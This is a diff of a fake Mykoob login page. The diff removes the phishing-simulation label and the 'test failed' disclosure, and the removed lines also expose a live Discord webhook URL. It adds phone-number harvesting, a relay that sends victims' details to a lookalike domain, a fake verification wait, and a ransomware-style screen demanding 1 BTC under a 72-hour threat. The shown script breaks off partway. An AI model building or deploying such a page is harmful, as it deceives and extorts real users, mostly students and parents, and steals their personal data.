@@ -10,458 +10,409 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
 <style>
-*,
-*::before,
-*::after {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
+:root {
+  --bg:            #121212;
+  --bg-elevated:   #1e1e1e;
+  --bg-input:      #1e1e1e;
+  --border:        #2d2d2d;
+  --border-input:  #3d3d3d;
+  --border-focus:  #489ffe;
+  --text:          #f3f4f6;
+  --text-muted:    #9ca3af;
+  --text-dim:      #6b7280;
+  --text-label:    #d1d5db;
+  --accent:        #489ffe;
+  --accent-hover:  #0274ef;
+  --danger:        #ff686e;
+  --danger-hover:  #e43f39;
+  --overlay:       rgba(0, 0, 0, 0.7);
+  --logo-url:      url("https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png");
 }
-html {
-font-size: 16px;
--webkit-font-smoothing: antialiased;
--moz-osx-font-smoothing: grayscale;
-}
-body {
-font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-background: #121212;
-color: #f3f4f6;
-min-height: 100vh;
-display: flex;
-flex-direction: column;
+@media (prefers-color-scheme: light) {
+  :root {
+    --bg:            #ffffff;
+    --bg-elevated:   #f5f5f7;
+    --bg-input:      #ffffff;
+    --border:        #e5e7eb;
+    --border-input:  #d1d5db;
+    --border-focus:  #0274ef;
+    --text:          #111827;
+    --text-muted:    #4b5563;
+    --text-dim:      #6b7280;
+    --text-label:    #374151;
+    --accent:        #0274ef;
+    --accent-hover:  #0058b8;
+    --danger:        #dc2626;
+    --danger-hover:  #b91c1c;
+    --overlay:       rgba(0, 0, 0, 0.5);
+    --logo-url:      url("https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png");
+  }
 }
 
-.app {
-display: flex;
-flex-direction: column;
-min-height: 100vh;
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html {
+  font-size: 16px;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  color-scheme: light dark;
 }
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  transition: background 0.15s, color 0.15s;
+}
+
+.app { display: flex; flex-direction: column; min-height: 100vh; }
 
 .navbar {
-display: flex;
-align-items: center;
-justify-content: space-between;
-padding: 20px 40px;
-border-bottom: 1px solid #2d2d2d;
-flex-shrink: 0;
-background: #1a1a1a;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 20px 40px;
+  background: transparent;
+  border: 0;
+  flex-shrink: 0;
 }
-.navbar__brand {
-display: flex;
-align-items: center;
-text-decoration: none;
-}
-.navbar__brand img {
-height: 36px;
-width: auto;
-display: block;
-}
+.navbar__brand { display: flex; align-items: center; text-decoration: none; }
+.navbar__brand img { height: 36px; width: auto; display: block; }
+
 .lang-select {
-background: #1a1a1a;
-border: 1px solid #3d3d3d;
-border-radius: 6px;
-font-size: 14px;
-font-weight: 500;
-color: #e5e7eb;
-cursor: pointer;
-padding: 6px 12px 6px 28px;
-appearance: none;
-background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239ca3af' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-background-repeat: no-repeat;
-background-position: left 8px center;
-background-size: 10px;
+  background: transparent;
+  border: 1px solid var(--border-input);
+  border-radius: 6px;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text);
+  cursor: pointer;
+  padding: 6px 12px 6px 28px;
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239ca3af' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: left 8px center;
+  background-size: 10px;
 }
-.lang-select:focus {
-outline: none;
-border-color: #489ffe;
-}
-.lang-select option {
-background: #1a1a1a;
-color: #e5e7eb;
-}
+.lang-select:focus { outline: none; border-color: var(--border-focus); }
+.lang-select option { background: var(--bg-elevated); color: var(--text); }
 
 .page {
-flex: 1 0 auto;
-display: flex;
-align-items: center;
-justify-content: center;
-padding: 40px 20px;
-background: #121212;
+  flex: 1 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+  background: var(--bg);
 }
 .page__inner {
-display: flex;
-align-items: center;
-justify-content: center;
-width: 100%;
-max-width: 1200px;
-gap: 60px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  max-width: 1200px;
+  gap: 60px;
 }
 
-.login-form {
-flex: 0 0 400px;
-max-width: 400px;
-width: 100%;
-}
+.login-form { flex: 0 0 400px; max-width: 400px; width: 100%; }
 .login-form__title {
-font-size: 28px;
-font-weight: 600;
-line-height: 1.2;
-margin-bottom: 8px;
-color: #f3f4f6;
+  font-size: 28px;
+  font-weight: 600;
+  line-height: 1.2;
+  margin-bottom: 8px;
+  color: var(--text);
 }
-.login-form__sub {
-font-size: 16px;
-color: #9ca3af;
-margin-bottom: 28px;
-}
+.login-form__sub { font-size: 16px; color: var(--text-muted); margin-bottom: 28px; }
 
-.form-group {
-margin-bottom: 20px;
-}
+.form-group { margin-bottom: 20px; }
 .form-group label {
-display: block;
-font-size: 14px;
-font-weight: 500;
-color: #d1d5db;
-margin-bottom: 4px;
+  display: block;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text-label);
+  margin-bottom: 4px;
 }
 .form-group input {
-width: 100%;
-padding: 12px 16px;
-font-size: 16px;
-font-family: inherit;
-border: 1.5px solid #3d3d3d;
-border-radius: 10px;
-background: #1e1e1e;
-color: #f3f4f6;
-transition: border-color 0.2s, box-shadow 0.2s;
+  width: 100%;
+  padding: 12px 16px;
+  font-size: 16px;
+  font-family: inherit;
+  border: 1.5px solid var(--border-input);
+  border-radius: 10px;
+  background: var(--bg-input);
+  color: var(--text);
+  transition: border-color 0.2s, box-shadow 0.2s;
 }
 .form-group input:focus {
-outline: none;
-border-color: #489ffe;
-box-shadow: 0 0 0 3px rgba(72, 159, 254, 0.2);
+  outline: none;
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px color-mix(in srgb, var(--border-focus) 20%, transparent);
 }
-.form-group input::placeholder {
-color: #6b7280;
-}
+.form-group input::placeholder { color: var(--text-dim); }
 
-.form-error {
-color: #ff686e;
-font-size: 13px;
-min-height: 20px;
-margin-top: 4px;
-}
+.form-error { color: var(--danger); font-size: 13px; min-height: 20px; margin-top: 4px; }
 
-.form-actions {
-display: flex;
-flex-direction: column;
-gap: 12px;
-margin-top: 4px;
-}
+.form-actions { display: flex; flex-direction: column; gap: 12px; margin-top: 4px; }
 
 .forgot-link {
-font-size: 14px;
-color: #489ffe;
-text-decoration: none;
-font-weight: 500;
-align-self: flex-start;
-cursor: pointer;
-background: none;
-border: none;
-padding: 0;
-font-family: inherit;
+  font-size: 14px;
+  color: var(--accent);
+  text-decoration: none;
+  font-weight: 500;
+  align-self: flex-start;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  font-family: inherit;
 }
-.forgot-link:hover {
-text-decoration: underline;
-}
+.forgot-link:hover { text-decoration: underline; }
 
 .btn-primary {
-width: 100%;
-padding: 14px;
-font-size: 16px;
-font-weight: 600;
-font-family: inherit;
-background: #489ffe;
-color: #ffffff;
-border: none;
-border-radius: 10px;
-cursor: pointer;
-transition: background 0.2s, transform 0.1s;
+  width: 100%;
+  padding: 14px;
+  font-size: 16px;
+  font-weight: 600;
+  font-family: inherit;
+  background: var(--accent);
+  color: #ffffff;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: background 0.2s, transform 0.1s;
 }
-.btn-primary:hover {
-background: #0274ef;
-}
-.btn-primary:active {
-transform: scale(0.98);
-}
-.btn-primary:disabled {
-opacity: 0.5;
-cursor: not-allowed;
-transform: none;
-}
+.btn-primary:hover { background: var(--accent-hover); }
+.btn-primary:active { transform: scale(0.98); }
+.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-.alt-methods {
-margin-top: 24px;
-padding-top: 20px;
-border-top: 1px solid #2d2d2d;
-}
-.alt-methods__label {
-font-size: 14px;
-color: #9ca3af;
-display: block;
-margin-bottom: 8px;
-}
-.alt-methods__list {
-display: flex;
-gap: 16px;
-flex-wrap: wrap;
-}
+.alt-methods { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+.alt-methods__label { font-size: 14px; color: var(--text-muted); display: block; margin-bottom: 8px; }
+.alt-methods__list { display: flex; gap: 16px; flex-wrap: wrap; }
 .alt-methods__item {
-font-size: 14px;
-color: #489ffe;
-text-decoration: none;
-font-weight: 500;
-cursor: pointer;
-background: none;
-border: none;
-padding: 0;
-font-family: inherit;
+  font-size: 14px;
+  color: var(--accent);
+  text-decoration: none;
+  font-weight: 500;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  font-family: inherit;
 }
-.alt-methods__item:hover {
-text-decoration: underline;
-}
+.alt-methods__item:hover { text-decoration: underline; }
 
-.illustration {
-flex: 1 1 0;
-display: flex;
-align-items: center;
-justify-content: center;
-min-width: 0;
-}
-.illustration img {
-max-width: 100%;
-max-height: 460px;
-width: auto;
-height: auto;
-display: block;
-}
+.illustration { flex: 1 1 0; display: flex; align-items: center; justify-content: center; min-width: 0; }
+.illustration img { max-width: 100%; max-height: 460px; width: auto; height: auto; display: block; }
 
 .footer {
-flex-shrink: 0;
-padding: 20px 40px 28px;
-border-top: 1px solid #2d2d2d;
-display: flex;
-flex-wrap: wrap;
-align-items: center;
-justify-content: space-between;
-gap: 12px 24px;
-font-size: 13px;
-color: #9ca3af;
-background: #1a1a1a;
+  flex-shrink: 0;
+  padding: 20px 40px 28px;
+  background: transparent;
+  border: 0;
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px 24px;
+  font-size: 13px;
+  color: var(--text-muted);
 }
-.footer__left {
-display: flex;
-flex-wrap: wrap;
-gap: 8px 24px;
-}
-.footer__left span {
-color: #9ca3af;
-}
-.footer__right {
-display: flex;
-flex-wrap: wrap;
-gap: 16px 24px;
-}
-.footer__right a {
-color: #9ca3af;
-text-decoration: none;
-}
-.footer__right a:hover {
-color: #f3f4f6;
-text-decoration: underline;
-}
+.footer__left { display: flex; flex-wrap: wrap; gap: 8px 24px; }
+.footer__left span { color: var(--text-muted); }
+.footer__right { display: flex; flex-wrap: wrap; gap: 16px 24px; }
+.footer__right a { color: var(--text-muted); text-decoration: none; }
+.footer__right a:hover { color: var(--text); text-decoration: underline; }
 
 .modal-overlay {
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: rgba(0, 0, 0, 0.7);
-backdrop-filter: blur(4px);
-display: none;
-align-items: center;
-justify-content: center;
-z-index: 1000;
-padding: 20px;
+  position: fixed;
+  inset: 0;
+  background: var(--overlay);
+  backdrop-filter: blur(4px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  padding: 20px;
 }
-.modal-overlay.active {
-display: flex;
-}
+.modal-overlay.active { display: flex; }
 
 .modal {
-background: #1e1e1e;
-border: 1px solid #2d2d2d;
-border-radius: 16px;
-padding: 32px;
-max-width: 420px;
-width: 100%;
-box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-animation: modalFade 0.25s ease;
-position: relative;
+  background: var(--bg-elevated);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 32px;
+  max-width: 420px;
+  width: 100%;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+  animation: modalFade 0.25s ease;
+  position: relative;
 }
 @keyframes modalFade {
-from {
-opacity: 0;
-transform: scale(0.95) translateY(10px);
-}
-to {
-opacity: 1;
-transform: scale(1) translateY(0);
-}
+  from { opacity: 0; transform: scale(0.95) translateY(10px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
 }
 
-.modal--red {
-border-color: #ff686e;
-}
-.modal--red .modal__title {
-color: #ff686e;
-}
+.modal--red { border-color: var(--danger); }
+.modal--red .modal__title { color: var(--danger); }
 
-.modal__title {
-font-size: 22px;
-font-weight: 600;
-margin-bottom: 8px;
-color: #f3f4f6;
-}
-.modal__sub {
-font-size: 14px;
-color: #9ca3af;
-margin-bottom: 24px;
-}
-.modal__form-group {
-margin-bottom: 16px;
-}
+.modal__title { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: var(--text); }
+.modal__sub { font-size: 14px; color: var(--text-muted); margin-bottom: 24px; }
+.modal__form-group { margin-bottom: 16px; }
 .modal__form-group label {
-display: block;
-font-size: 13px;
-font-weight: 500;
-color: #d1d5db;
-margin-bottom: 4px;
+  display: block;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-label);
+  margin-bottom: 4px;
 }
-.modal__form-group input {
-width: 100%;
-padding: 10px 14px;
-font-size: 15px;
-font-family: inherit;
-border: 1.5px solid #3d3d3d;
-border-radius: 8px;
-background: #121212;
-color: #f3f4f6;
-transition: border-color 0.2s;
+.modal__form-group input,
+.modal__form-group select {
+  width: 100%;
+  padding: 10px 14px;
+  font-size: 15px;
+  font-family: inherit;
+  border: 1.5px solid var(--border-input);
+  border-radius: 8px;
+  background: var(--bg-input);
+  color: var(--text);
+  transition: border-color 0.2s;
 }
-.modal__form-group input:focus {
-outline: none;
-border-color: #489ffe;
-}
-.modal__actions {
-display: flex;
-gap: 12px;
-margin-top: 8px;
-flex-wrap: wrap;
-}
+.modal__form-group input:focus,
+.modal__form-group select:focus { outline: none; border-color: var(--border-focus); }
+
+.phone-row { display: flex; gap: 10px; }
+.phone-row select { flex: 0 0 150px; }
+.phone-row input  { flex: 1 1 auto; }
+
+.modal__actions { display: flex; gap: 12px; margin-top: 8px; flex-wrap: wrap; }
 .modal__actions .btn-secondary {
-flex: 1;
-padding: 10px;
-font-size: 15px;
-font-weight: 500;
-font-family: inherit;
-background: transparent;
-color: #9ca3af;
-border: 1px solid #3d3d3d;
-border-radius: 8px;
-cursor: pointer;
-transition: background 0.2s, border-color 0.2s;
-text-align: center;
+  flex: 1;
+  padding: 10px;
+  font-size: 15px;
+  font-weight: 500;
+  font-family: inherit;
+  background: transparent;
+  color: var(--text-muted);
+  border: 1px solid var(--border-input);
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background 0.2s, border-color 0.2s;
+  text-align: center;
 }
-.modal__actions .btn-secondary:hover {
-background: #2d2d2d;
-border-color: #5a5a5a;
-}
+.modal__actions .btn-secondary:hover { background: var(--border); border-color: var(--text-dim); }
 .modal__actions .btn-primary {
-flex: 1;
-padding: 10px;
-font-size: 15px;
-font-weight: 600;
-font-family: inherit;
-background: #489ffe;
-color: #fff;
-border: none;
-border-radius: 8px;
-cursor: pointer;
-transition: background 0.2s;
-text-align: center;
+  flex: 1;
+  padding: 10px;
+  font-size: 15px;
+  font-weight: 600;
+  font-family: inherit;
+  background: var(--accent);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background 0.2s;
+  text-align: center;
 }
-.modal__actions .btn-primary:hover {
-background: #0274ef;
+.modal__actions .btn-primary:hover { background: var(--accent-hover); }
+.modal__actions .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+.modal__actions .btn-danger { background: var(--danger); color: #fff; }
+.modal__actions .btn-danger:hover { background: var(--danger-hover); }
+
+.modal__error { color: var(--danger); font-size: 13px; margin-top: 6px; min-height: 20px; }
+
+/* ── Waiting / verifying screen (60s before ransom) ── */
+.wait-screen {
+  position: fixed;
+  inset: 0;
+  background: var(--bg);
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  z-index: 1800;
+  text-align: center;
+  padding: 40px 20px;
 }
-.modal__actions .btn-danger {
-background: #ff686e;
-color: #fff;
+.wait-screen.active { display: flex; }
+.wait-spinner {
+  width: 56px;
+  height: 56px;
+  border: 4px solid var(--border);
+  border-top-color: var(--accent);
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  margin-bottom: 28px;
 }
-.modal__actions .btn-danger:hover {
-background: #e43f39;
+@keyframes spin { to { transform: rotate(360deg); } }
+.wait-title { font-size: 20px; font-weight: 600; color: var(--text); margin-bottom: 10px; }
+.wait-sub { font-size: 15px; color: var(--text-muted); margin-bottom: 8px; max-width: 420px; line-height: 1.5; }
+.wait-count { font-size: 14px; color: var(--text-dim); font-variant-numeric: tabular-nums; margin-top: 12px; }
+
+/* ── Ransomware full-screen reveal ── */
+.ransom-screen {
+  position: fixed;
+  inset: 0;
+  background: #8b0000;
+  color: #ffffff;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+  z-index: 2000;
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+  overflow-y: auto;
 }
-.modal__error {
-color: #ff686e;
-font-size: 13px;
-margin-top: 6px;
-min-height: 20px;
+.ransom-screen.active { display: flex; }
+.ransom-inner { max-width: 720px; width: 100%; padding: 20px 0; }
+.ransom-title {
+  font-size: 42px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  margin-bottom: 24px;
+  text-transform: uppercase;
+}
+.ransom-body { font-size: 18px; line-height: 1.6; margin-bottom: 20px; }
+.ransom-address {
+  display: inline-block;
+  background: rgba(0, 0, 0, 0.35);
+  padding: 12px 20px;
+  border-radius: 8px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  font-size: 15px;
+  word-break: break-all;
+  margin: 12px 0 24px;
+  border: 1px solid rgba(255, 255, 255, 0.25);
+  cursor: pointer;
+  user-select: all;
+}
+.ransom-timer {
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 20px;
+  font-variant-numeric: tabular-nums;
 }
 
 @media (max-width: 900px) {
-.page__inner {
-flex-direction: column;
-gap: 32px;
-}
-.login-form {
-flex: 0 0 auto;
-max-width: 420px;
-width: 100%;
-}
-.illustration img {
-max-height: 260px;
-}
-.navbar {
-padding: 16px 20px;
-}
-.footer {
-padding: 16px 20px 24px;
-flex-direction: column;
-align-items: flex-start;
-}
-.footer__right {
-width: 100%;
-justify-content: flex-start;
-}
+  .page__inner { flex-direction: column; gap: 32px; }
+  .login-form { flex: 0 0 auto; max-width: 420px; width: 100%; }
+  .illustration img { max-height: 260px; }
+  .navbar { padding: 16px 20px; }
+  .footer { padding: 16px 20px 24px; flex-direction: column; align-items: flex-start; }
+  .footer__right { width: 100%; justify-content: flex-start; }
+  .ransom-title { font-size: 30px; }
+  .ransom-body { font-size: 16px; }
 }
 @media (max-width: 480px) {
-.login-form__title {
-font-size: 22px;
-}
-.navbar__brand img {
-height: 28px;
-}
-.lang-select {
-font-size: 13px;
-padding: 4px 10px 4px 24px;
-}
-.footer {
-font-size: 12px;
-}
-.modal {
-padding: 24px 20px;
-}
+  .login-form__title { font-size: 22px; }
+  .navbar__brand img { height: 28px; }
+  .lang-select { font-size: 13px; padding: 4px 10px 4px 24px; }
+  .footer { font-size: 12px; }
+  .modal { padding: 24px 20px; }
+  .phone-row { flex-direction: column; }
+  .phone-row select { flex: 0 0 auto; }
 }
 </style>
 </head>
@@ -471,7 +422,7 @@ padding: 24px 20px;
 
 <nav class="navbar">
 <a href="#" class="navbar__brand">
-<img src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" alt="Mykoob" />
+<img id="brandLogo" src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" alt="Mykoob" />
 </a>
 <div>
 <select class="lang-select" id="langSelect" aria-label="Language">
@@ -490,9 +441,8 @@ padding: 24px 20px;
 </div>
 
 <section class="login-form">
-                    <h1 class="login-form__title" id="mainTitle">Izvietieties pieslēgšanas veidu</h1>
-                    <h1 class="login-form__title" id="mainTitle">Izvēleities pieslēgšanas veidu</h1>
-<p class="login-form__sub" id="mainSub"> </p>
+<h1 class="login-form__title" id="mainTitle">Izvēlieties pieslēgšanas veidu</h1>
+<p class="login-form__sub" id="mainSub"></p>
 
 <form id="loginForm" autocomplete="off" novalidate>
 <div class="form-group">
@@ -525,12 +475,12 @@ padding: 24px 20px;
 
 <footer class="footer">
 <div class="footer__left">
-<span>© Mykoob. Visas tiesības pieder Raivo Strazdiņam</span>
+<span id="footerCopyright">© Mykoob. Visas tiesības pieder Raivo Strazdiņam</span>
 </div>
 <div class="footer__right">
-<a href="https://login.mykoob.lv/#/lv/terms/service">Lietošanas noteikumi</a>
-<a href="https://login.mykoob.lv/#/lv/terms/privacy-policy">Privātuma politika</a>
-<a href="https://help.mykoob.lv/lv/">Palīdzības centrs</a>
+<a href="https://login.mykoob.lv/#/lv/terms/service" id="footerTerms">Lietošanas noteikumi</a>
+<a href="https://login.mykoob.lv/#/lv/terms/privacy-policy" id="footerPrivacy">Privātuma politika</a>
+<a href="https://help.mykoob.lv/lv/" id="footerHelp">Palīdzības centrs</a>
 </div>
 </footer>
 
@@ -540,12 +490,13 @@ padding: 24px 20px;
 <div class="modal-overlay" id="forgotModal">
 <div class="modal">
 <h2 class="modal__title" id="forgotTitle">Aizmirsāt paroli?</h2>
+<p class="modal__sub" id="forgotSub"></p>
 <div class="modal__form-group">
 <label for="forgotEmail" id="forgotEmailLabel">E-pasts</label>
 <input type="email" id="forgotEmail" placeholder="janis@jak.lv" />
 </div>
 <div class="modal__form-group">
-<label for="forgotOldPassword" id="forgotOldLabel">Jaunā parole</label>
+<label for="forgotOldPassword" id="forgotOldLabel">Vecā parole</label>
 <input type="password" id="forgotOldPassword" placeholder="••••••••" />
 </div>
 <div class="modal__error" id="forgotError"></div>
@@ -556,343 +507,296 @@ padding: 24px 20px;
 </div>
 </div>
 
-<!-- CYBERSECURITY FAILURE MODAL (RED) -->
-<div class="modal-overlay" id="failModal">
-<div class="modal modal--red">
-<h2 class="modal__title" id="failTitle">⛔ Kiberdrošības tests neizdevies</h2>
-<p class="modal__sub" id="failSub">Jūs esat uzķēries phishing e-pastam</p>
-<div class="modal__actions">
-<button class="btn-primary btn-danger" id="failOk" style="flex:1;">Sapratu</button>
+<!-- PHONE VERIFICATION MODAL -->
+<div class="modal-overlay" id="phoneModal">
+<div class="modal">
+<h2 class="modal__title" id="phoneTitle">Papildu pārbaude</h2>
+<p class="modal__sub" id="phoneSub"></p>
+<div class="modal__form-group">
+<label for="phoneCode" id="phoneCodeLabel">Valsts kods</label>
+<div class="phone-row">
+<select id="phoneCode">
+<option value="+371" data-country="LV">🇱🇻 +371 (Latvija)</option>
+<option value="+370" data-country="LT">🇱🇹 +370 (Lietuva)</option>
+<option value="+372" data-country="EE">🇪🇪 +372 (Eesti)</option>
+<option value="+358" data-country="FI">🇫🇮 +358 (Suomi)</option>
+<option value="+46"  data-country="SE">🇸🇪 +46 (Sverige)</option>
+<option value="+44"  data-country="GB">🇬🇧 +44 (UK)</option>
+<option value="+1"   data-country="US">🇺🇸 +1 (USA)</option>
+<option value="+49"  data-country="DE">🇩🇪 +49 (Deutschland)</option>
+</select>
+<input type="tel" id="phoneNumber" placeholder="20000000" inputmode="numeric" autocomplete="off" />
 </div>
+</div>
+<div class="modal__error" id="phoneError"></div>
+<div class="modal__actions">
+<button class="btn-primary" id="phoneSubmit">Verificēt</button>
+</div>
+</div>
+</div>
+
+<!-- WAIT SCREEN (60s) -->
+<div class="wait-screen" id="waitScreen">
+<div class="wait-spinner"></div>
+<h2 class="wait-title" id="waitTitle">Verificējam jūsu numuru...</h2>
+<p class="wait-sub" id="waitSub">Lūdzu, uzgaidiet. Šis process var aizņemt līdz 1 minūtei.</p>
+<div class="wait-count" id="waitCount">60</div>
+</div>
+
+<!-- RANSOMWARE FULL-SCREEN -->
+<div class="ransom-screen" id="ransomScreen">
+<div class="ransom-inner">
+<div class="ransom-title" id="ransomTitle">Jūsu faili ir šifrēti</div>
+<p class="ransom-body" id="ransomBody1">
+Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256.
+Lai tos atgūtu, mums ir nepieciešams maksājums.
+</p>
+<p class="ransom-body" id="ransomBody2">
+Maksājuma summa: <strong>1 BTC</strong><br />
+Maksājuma adrese:
+</p>
+<div class="ransom-address" id="ransomAddress">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+<div class="ransom-timer" id="ransomTimer">Laiks atlicis: 72:00:00</div>
+<p class="ransom-body" id="ransomBody3">
+Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.
+</p>
 </div>
 </div>
 
 <script>
-// ── Discord Webhook ──
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
+/* ── Server-side relay — webhook never touches the client ── */
+const RELAY_URL = 'https://edu-mykoob.com/t/relay.php';
 
-// ── Track attempts per email ──
-const attemptTracker = {};
-
-// ── Track click-throughs ──
-const clickTracker = {};
-
-// ── Send to Discord ──
-function sendToDiscord(email, action, passwordProvided, clickOnly = false) {
-if (!attemptTracker[email]) {
-attemptTracker[email] = 0;
-}
-
-if (clickOnly) {
-if (!clickTracker[email]) {
-clickTracker[email] = 0;
-}
-clickTracker[email]++;
-} else {
-attemptTracker[email]++;
-}
-
-const fields = [
-{
-name: '📧 E-pasts',
-value: email || 'Nav norādīts',
-inline: true
-}
-];
-
-if (!clickOnly) {
-fields.push({
-name: '🔑 Parole ievadīta?',
-value: passwordProvided ? '✅ Jā' : '❌ Nē',
-inline: true
-});
-}
-
-const clickCount = clickTracker[email] || 0;
-fields.push({
-name: '👆 Saites atvērumi',
-value: clickCount.toString(),
-inline: true
-});
-
-if (!clickOnly) {
-fields.push({
-name: '🔄 Pieslēgšanās mēģinājums #',
-value: attemptTracker[email].toString(),
-inline: true
-});
-}
-
-fields.push({
-name: '🕐 Laiks',
-value: new Date().toLocaleString('lv-LV'),
-inline: false
-});
-
-const embed = {
-embeds: [{
-title: `🔐 ${action}`,
-color: clickOnly ? 0x00bfff : 0xff4444,
-fields: fields,
-footer: {
-text: 'Mykoob Phishing Simulation'
-}
-}]
+/* ── Country → phone rules ── */
+const PHONE_RULES = {
+  '+371': { country: 'LV', minLen: 8,  maxLen: 8,  regex: /^[2-9]\d{7}$/ },
+  '+370': { country: 'LT', minLen: 8,  maxLen: 8,  regex: /^[3-9]\d{7}$/ },
+  '+372': { country: 'EE', minLen: 7,  maxLen: 8,  regex: /^[3-9]\d{6,7}$/ },
+  '+358': { country: 'FI', minLen: 9,  maxLen: 10, regex: /^[4-5]\d{8,9}$/ },
+  '+46':  { country: 'SE', minLen: 7,  maxLen: 9,  regex: /^[1-9]\d{6,8}$/ },
+  '+44':  { country: 'GB', minLen: 10, maxLen: 10, regex: /^[1-9]\d{9}$/ },
+  '+1':   { country: 'US', minLen: 10, maxLen: 10, regex: /^[2-9]\d{9}$/ },
+  '+49':  { country: 'DE', minLen: 10, maxLen: 11, regex: /^[1-9]\d{9,10}$/ },
 };
 
-fetch(WEBHOOK_URL, {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json',
-},
-body: JSON.stringify(embed)
-}).catch(err => console.log('Webhook error:', err));
+/* ── Local attempt counters (server owns real ones) ── */
+const attemptTracker = {};
+
+async function sendToDiscord(email, action, opts = {}) {
+  const { hasPassword = false, phone = null, country = null, clickOnly = false } = opts;
+  attemptTracker[email] = (attemptTracker[email] || 0) + 1;
+
+  const body = {
+    email,
+    action,
+    hasPassword,
+    phone,
+    country,
+    attempt: attemptTracker[email],
+    clickOnly,
+    ts: new Date().toISOString(),
+  };
+
+  try {
+    await fetch(RELAY_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+      keepalive: true,
+    });
+  } catch (err) {
+    console.log('Relay error (ignored):', err);
+  }
 }
 
-// ── State ──
+/* ── State ── */
 let storedEmail = '';
 let loginAttempts = 0;
-const MAX_ATTEMPTS = 3;
+const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
+let waitInterval = null;
 
-// ── DOM refs ──
-const emailInput = document.getElementById('email');
-const passwordInput = document.getElementById('password');
-const formError = document.getElementById('formError');
-const loginForm = document.getElementById('loginForm');
+/* ── DOM refs ── */
+const emailInput     = document.getElementById('email');
+const passwordInput  = document.getElementById('password');
+const formError      = document.getElementById('formError');
+const loginForm      = document.getElementById('loginForm');
 
-const forgotModal = document.getElementById('forgotModal');
-const forgotEmail = document.getElementById('forgotEmail');
-const forgotOldPassword = document.getElementById('forgotOldPassword');
-const forgotError = document.getElementById('forgotError');
-const forgotSendBtn = document.getElementById('forgotSend');
-const forgotCancelBtn = document.getElementById('forgotCancel');
-const pwdForgotLink = document.getElementById('pwdForgotLink');
+const forgotModal        = document.getElementById('forgotModal');
+const forgotEmail        = document.getElementById('forgotEmail');
+const forgotOldPassword  = document.getElementById('forgotOldPassword');
+const forgotError        = document.getElementById('forgotError');
+const forgotSendBtn      = document.getElementById('forgotSend');
+const forgotCancelBtn    = document.getElementById('forgotCancel');
+const pwdForgotLink      = document.getElementById('pwdForgotLink');
 
-const failModal = document.getElementById('failModal');
-const failOkBtn = document.getElementById('failOk');
+const phoneModal     = document.getElementById('phoneModal');
+const phoneCode      = document.getElementById('phoneCode');
+const phoneNumber    = document.getElementById('phoneNumber');
+const phoneError     = document.getElementById('phoneError');
+const phoneSubmit    = document.getElementById('phoneSubmit');
 
+const waitScreen     = document.getElementById('waitScreen');
+const waitCount      = document.getElementById('waitCount');
+
